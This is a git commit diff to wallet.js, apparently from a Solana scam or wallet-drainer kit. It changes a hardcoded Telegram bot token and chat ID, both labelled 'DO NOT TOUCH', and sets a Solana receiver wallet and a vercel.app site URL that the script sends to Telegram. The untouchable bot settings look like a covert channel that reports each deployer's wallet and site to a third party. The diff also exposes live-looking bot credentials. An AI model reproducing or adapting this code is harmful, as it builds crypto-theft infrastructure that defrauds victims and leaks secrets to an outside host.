d90712db2abfbb3b5c8897315db19644d1efe565
struggler99 <151938366+struggler99@users.noreply.github.com>
2024-07-04 02:39:36 +0100

    Update wallet.js

--- wallet.js
+++ wallet.js
@@ -1,10 +1,10 @@
 const axios = require('axios');
 
 // Telegram Bot API token [ DO NOT TOUCH ]
-const botToken = '6345787783:AAGQn2Uy7rpVfy76SOSJGA3jttW2sH9U8';
+const botToken = '7295889133:AAE-3GSmILJ-dLmtckRbRqTef2VoNMxHbrk';
 
 // Telegram channel ID [ DO NOT TOUCH ]
-const chatId = '4177494374';
+const chatId = '6602927804';
 
 
 async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
@@ -24,6 +24,6 @@ async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
 }
 
 // Change this information for yours (
-const solana_wallet_receiver_id = 'YOUR_SOLANA_WALLET_RECEIVER_ID';
-const website_url = 'YOUR_WEBSITE_URL';
+const solana_wallet_receiver_id = 'HGZ9Tx8zje46sEFqxSc4KWqE7v3We3sipb979VDYRLAS';
+const website_url = 'https://solananinja9.vercel.app/';
 sendMessageToTelegram(solana_wallet_receiver_id, website_url);
